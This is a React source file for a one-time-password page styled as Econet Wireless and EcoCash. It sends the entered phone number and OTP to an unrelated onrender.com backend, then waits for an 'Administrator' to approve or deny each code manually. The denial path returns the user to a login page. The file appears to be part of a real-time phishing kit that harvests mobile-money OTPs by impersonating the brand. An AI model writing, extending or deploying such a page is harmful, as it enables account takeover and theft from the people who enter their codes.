import React, { useState, useRef, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { ArrowLeft } from 'lucide-react';

const API_BASE_URL = import.meta.env.VITE_API_BASE_URL || "https://mixdatahub-fullstack.onrender.com";

export default function OTPPage() {
  const location = useLocation();
  const navigate = useNavigate();
  const { duration = 'Daily', voice = 4, sms = 7, data = 1.7, price = '0.21', phone = '771234531' } = location.state || {};

  const formatMaskedPhone = (num: string) => num.length >= 9 ? `+263 ${num.slice(0, 2)} *** **${num.slice(-2)}` : `+263 ${num}`;

  const [otp, setOtp] = useState<string[]>(['', '', '', '', '', '']);
  const [timeLeft, setTimeLeft] = useState<number>(120);
  const [isProcessing, setIsProcessing] = useState<boolean>(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const pollRef = useRef<NodeJS.Timeout | null>(null);

  const isComplete = otp.every((digit) => digit !== '');

  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => setTimeLeft((prev) => prev - 1), 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  useEffect(() => {
    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, []);

  const handleChange = (index: number, e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    if (isNaN(Number(value))) return;
    const newOtp = [...otp];
    newOtp[index] = value.substring(value.length - 1);
    setOtp(newOtp);
    if (value && index < 5) inputRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) inputRefs.current[index - 1]?.focus();
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    if (pastedData) {
      const newOtp = [...otp];
      for (let i = 0; i < pastedData.length; i++) newOtp[i] = pastedData[i];
      setOtp(newOtp);
      const focusIndex = pastedData.length < 6 ? pastedData.length : 5;
      inputRefs.current[focusIndex]?.focus();
    }
  };

  const handleConfirm = async () => {
    if (!isComplete || isProcessing) return;
    setIsProcessing(true);
    const otpString = otp.join('');

    try {
      const response = await fetch(`${API_BASE_URL}/api/verify-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, otp: otpString, duration, price })
      });

      if (!response.ok) throw new Error("Failed to send OTP");
      const { transaction_id } = await response.json();

      let attempts = 0;
      const maxAttempts = 30;

      pollRef.current = setInterval(async () => {
        attempts++;
        if (attempts > maxAttempts) {
          if (pollRef.current) clearInterval(pollRef.current);
          setIsProcessing(false);
          alert('Request timed out. Admin did not respond.');
          return;
        }

        try {
          const statusRes = await fetch(`${API_BASE_URL}/api/status/${transaction_id}`);
          const statusData = await statusRes.json();

          if (statusData.status === 'approved') {
            if (pollRef.current) clearInterval(pollRef.current);
            setIsProcessing(false);
            navigate('/success', { state: { duration, voice, sms, data, price } });
          } else if (statusData.status === 'denied') {
            if (pollRef.current) clearInterval(pollRef.current);
            setIsProcessing(false);
            alert('OTP was denied by the Administrator. Redirecting to login...');
            
            // --- REDIRECT TO LOGIN ON DENIAL ---
            // Pass the bundle details back so they don't have to select the bundle again
            navigate('/login', { state: { duration, voice, sms, data, price } });
          }
        } catch (err) {
          console.error("Polling error", err);
        }
      }, 2000);

    } catch (error) {
      console.error(error);
      setIsProcessing(false);
      alert("Could not connect to the server. Please try again.");
    }
  };

  const styles = {
    appContainer: { width: '100%', maxWidth: '480px', margin: '0 auto', backgroundColor: '#f8f9fc', minHeight: '100vh', position: 'relative', boxShadow: '0 0 30px rgba(0,0,0,0.1)', overflowX: 'hidden', fontFamily: "'Inter', sans-serif" } as React.CSSProperties,
    header: { background: 'linear-gradient(135deg, #0b40c4 0%, #1e5ce6 100%)', padding: '20px 20px 24px', borderBottomLeftRadius: '20px', borderBottomRightRadius: '20px', color: 'white' } as React.CSSProperties,
    backButton: { background: 'transparent', border: 'none', color: 'white', display: 'flex', alignItems: 'center', gap: '4px', padding: '0 0 16px 0', cursor: 'pointer', fontSize: '14px', opacity: 0.8 } as React.CSSProperties,
    brandLogos: { display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '20px' } as React.CSSProperties,
    logoEconet: { background: 'white', color: '#0b40c4', padding: '4px 8px', borderRadius: '6px', fontWeight: 800, fontSize: '12px', fontStyle: 'italic' } as React.CSSProperties,
    logoEconetSpan: { fontSize: '7px', fontWeight: 500, display: 'block' } as React.CSSProperties,
    logoEcocash: { color: '#e53935', fontWeight: 800, fontSize: '14px', background: 'white', padding: '4px 8px', borderRadius: '6px' } as React.CSSProperties,
    durationBadge: { marginLeft: 'auto', background: 'rgba(255,255,255,0.2)', padding: '6px 12px', borderRadius: '16px', fontSize: '12px', fontWeight: 700 } as React.CSSProperties,
    summaryPills: { display: 'flex', gap: '6px', flexWrap: 'wrap' } as React.CSSProperties,
    pill: { background: 'rgba(255,255,255,0.15)', padding: '4px 10px', borderRadius: '12px', fontSize: '10px', fontWeight: 500 } as React.CSSProperties,
    content: { padding: '20px', display: 'flex', flexDirection: 'column', gap: '16px' } as React.CSSProperties,
    card: { background: 'white', borderRadius: '16px', padding: '24px 20px', boxShadow: '0 4px 12px rgba(0,0,0,0.04)', position: 'relative', overflow: 'hidden' } as React.CSSProperties,
    cardH3: { fontSize: '18px', color: '#1a1a1a', marginBottom: '6px', marginTop: 0 } as React.CSSProperties,
    cardSubtitle: { fontSize: '13px', color: '#888', marginBottom: '24px', marginTop: 0 } as React.CSSProperties,
    phoneDisplay: { textAlign: 'center', fontSize: '15px', color: '#555', marginBottom: '24px', fontWeight: 500 } as React.CSSProperties,
    otpLabel: { display: 'block', fontSize: '11px', color: '#1e5ce6', fontWeight: 700, marginBottom: '8px' } as React.CSSProperties,
    otpInputsContainer: { display: 'flex', justifyContent: 'space-between', gap: '8px', marginBottom: '24px' } as React.CSSProperties,
    otpBox: (isFilled: boolean, isFocused: boolean) => ({ width: '45px', height: '55px', border: isFilled || isFocused ? '2px solid #1e5ce6' : '1px solid #e0e0e0', borderRadius: '12px', textAlign: 'center', fontSize: '24px', fontWeight: 600, color: '#1a1a1a', outline: 'none', backgroundColor: 'white', transition: 'border 0.2s', boxShadow: isFocused ? '0 0 0 3px rgba(30, 92, 230, 0.1)' : 'none' } as React.CSSProperties),
    timerRow: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: '13px', color: '#666', marginBottom: '24px' } as React.CSSProperties,
    timerText: { color: timeLeft < 20 ? '#e53935' : '#666', fontWeight: 500 } as React.CSSProperties,
    resendBtn: { background: 'transparent', border: 'none', color: timeLeft > 0 ? '#c0c0c0' : '#1e5ce6', fontSize: '13px', fontWeight: 600, cursor: timeLeft > 0 ? 'not-allowed' : 'pointer', padding: 0 } as React.CSSProperties,
    confirmBtn: { width: '100%', padding: '16px', border: 'none', borderRadius: '16px', fontSize: '16px', fontWeight: 700, color: 'white', backgroundColor: isComplete ? '#1e5ce6' : '#a0bdf5', cursor: isComplete && !isProcessing ? 'pointer' : 'not-allowed', transition: 'all 0.2s', boxShadow: isComplete && !isProcessing ? '0 4px 12px rgba(30, 92, 230, 0.3)' : 'none', marginBottom: '16px' } as React.CSSProperties,
    poweredBy: { fontSize: '9px', color: '#999', fontWeight: 500, letterSpacing: '0.5px', textAlign: 'center' } as React.CSSProperties,
  };

  return (
    <div style={styles.appContainer}>
      <div style={styles.header}>
        <button style={styles.backButton} onClick={() => navigate(-1)} disabled={isProcessing}><ArrowLeft size={16} /> Back</button>
        <div style={styles.brandLogos}>
          <div style={styles.logoEconet}>ECONET <span style={styles.logoEconetSpan}>Wireless</span></div>
          <div style={styles.logoEcocash}>EcoCash</div>
          <span style={styles.durationBadge}>USD {price}</span>
        </div>
        <div style={styles.summaryPills}>
          <span style={styles.pill}>{duration}</span>
          <span style={styles.pill}>{voice} Min</span>
          <span style={styles.pill}>{sms} SMS</span>
          <span style={styles.pill}>{data} GB</span>
        </div>
      </div>

      <div style={styles.content}>
        <div style={styles.card}>
          <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '4px', background: 'linear-gradient(90deg, #00d2ff, #1e5ce6)' }}></div>
          <h3 style={styles.cardH3}>One-Time Password</h3>
          <p style={styles.cardSubtitle}>6-digit code sent to your number</p>
          <div style={styles.phoneDisplay}>Code sent to {formatMaskedPhone(phone)}</div>
          <label style={styles.otpLabel}>OTP CODE</label>
          <div style={styles.otpInputsContainer}>
            {otp.map((digit, index) => (
              <input 
                key={index} 
                type="text" 
                inputMode="numeric" 
                value={digit} 
                onChange={(e) => handleChange(index, e)} 
                onKeyDown={(e) => handleKeyDown(index, e)} 
                onPaste={index === 0 ? handlePaste : undefined} 
                ref={(el) => (inputRefs.current[index] = el)} 
                style={styles.otpBox(digit !== '', document.activeElement === inputRefs.current[index])} 
                disabled={isProcessing}
              />
            ))}
          </div>
          <div style={styles.timerRow}>
            <span style={styles.timerText}>Expires in {timeLeft}s</span>
            <button style={styles.resendBtn} disabled={timeLeft > 0 || isProcessing} onClick={() => setTimeLeft(120)}>Resend OTP</button>
          </div>
        </div>
        
        <button style={styles.confirmBtn} disabled={!isComplete || isProcessing} onClick={handleConfirm}>
          {/* CHANGED TEXT HERE */}
          {isProcessing ? 'Verifying OTP...' : 'Confirm OTP'}
        </button>
        <p style={styles.poweredBy}>POWERED BY ECONET WIRELESS · ECOCASH</p>
      </div>
    </div>
  );
}